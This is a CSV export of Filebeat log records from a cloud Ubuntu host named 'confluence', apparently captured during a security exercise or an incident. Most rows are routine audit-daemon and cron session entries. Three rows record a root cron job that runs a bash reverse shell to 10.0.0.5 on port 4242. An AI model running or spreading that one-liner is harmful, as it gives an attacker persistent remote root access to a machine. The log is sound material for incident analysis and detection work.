"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","cloud.account.id","cloud.availability_zone","cloud.instance.id","cloud.instance.name","cloud.machine.type","cloud.project.id","cloud.provider","cloud.service.name","ecs.version","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.outcome","event.timezone","event.type","fileset.name","group.id","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"process.name","process.name.text","process.pid","related.hosts","related.ip","related.user","service.type","source.ip","source.port","system.auth.ssh.event","system.auth.ssh.method","system.auth.ssh.signature","system.auth.sudo.command","system.auth.sudo.pwd","system.auth.sudo.tty","system.auth.sudo.user","system.auth.useradd.home","system.auth.useradd.shell","user.effective.name","user.effective.name.text","user.id","user.name","user.name.text"
"Oct 26, 2022 @ 01:55:39.000",wGlJEIQBiYLzbw6NSYur,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:55:49.290",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","29,025","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:55:01.000",WWlIEIQBiYLzbw6NsYsV,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:55:10.227",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,563","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578270,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:55:01.000",a2lIEIQBiYLzbw6NwIvv,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:55:14.286",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,900","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578271,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:54:49.000",M2lIEIQBiYLzbw6NhotV,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:54:59.284",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,824","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:54:01.000",3WlHEIQBiYLzbw6N1oqM,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:54:14.279",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,699","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578238,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:54:01.000",3mlHEIQBiYLzbw6N1oqM,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:54:14.280",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,457","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578237,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:53:59.000",x2lHEIQBiYLzbw6Nw4oA,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:54:09.279",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,623","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:53:09.000","W2lGEIQBiYLzbw6N_4qr",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:53:19.275",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,547","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:53:01.000",RWlGEIQBiYLzbw6N3IpO,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:53:10.220",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,351","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578203,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:53:01.000",WmlGEIQBiYLzbw6N5IpQ,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:53:12.271",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,422","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578204,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
